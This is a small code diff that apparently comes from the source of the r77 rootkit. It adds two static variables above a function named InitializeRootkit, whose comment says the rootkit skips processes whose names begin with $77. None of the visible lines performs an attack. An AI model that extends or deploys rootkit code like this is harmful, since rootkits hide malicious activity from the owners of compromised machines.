@@ -4,6 +4,9 @@
 #include "r77def.h"
 #include <Shlwapi.h>
 
+static BOOL RootkitInitialized;
+static HINSTANCE Module;
+
 BOOL InitializeRootkit(HINSTANCE module)
 {
 	// If the process starts with $77, do not load r77.
